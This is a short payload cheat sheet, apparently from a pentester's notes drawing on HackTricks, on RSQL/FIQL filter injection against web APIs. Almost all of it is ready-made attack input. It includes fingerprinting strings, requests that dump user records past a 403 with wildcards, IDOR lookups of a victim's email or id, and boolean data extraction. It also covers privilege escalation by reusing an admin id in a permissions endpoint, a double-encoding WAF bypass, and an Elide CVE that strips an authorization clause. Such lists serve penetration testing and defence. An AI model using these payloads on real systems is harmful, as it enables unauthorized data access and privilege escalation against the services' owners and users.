---
title: "Payloads: RSQL / FIQL Injection"
type: payloads
tags: [payloads, rsql, fiql, injection, api, web]
sources: [hacktricks-web]
date_created: 2026-07-14
date_updated: 2026-07-14
---

# Payloads: RSQL / FIQL Injection

RSQL/FIQL filter-grammar abuse for enumeration, IDOR, and authz bypass. See [[rsql-injection]].

## Fingerprint / operators
Operators: `;`=AND `,`=OR `==` `!=` `=q=` `=like=` `=in=` `=out=` `=lt=` `=gt=` `=ge=` `=le=`
`=rng=`; custom `=ilike=` `=isnull=` `=between=` reveal Elide/JPA.
```
?filter=id==test         ?q==test         =foo=          // error-leak fingerprint
==*foo*   =ini=*FOO*   =isnull=true   =isempty=true   =between=(1,10)
```

## Enumeration / leak / IDOR
```
GET /api/registrations?filter[userAccounts]=email=='victim@x.com'
GET /api/users?filter[users]=id=in=(*a*)                         // dump past 403 via wildcard
GET /api/users?include=language,country&filter[users]=id=='<victimId>'
filter[users]=email==*%@example.com;status==ACTIVE               // boolean exfil, flip to , for OR
filter[users]=createdAt=rng=(2024-01-01,2025-01-01)              // range enumerate by year
```

## Privesc (find an admin id, reuse it in a permissions endpoint)
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='<adminId>'
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='<adminId>'
```

WAF/blocklist bypass (double-encode reserved chars): `%2528admin%2529` for `(admin)`.
Elide analytics CVE-2022-24827: field-argument value containing `--` strips the auth WHERE clause.

Source: HackTricks (pentesting-web)
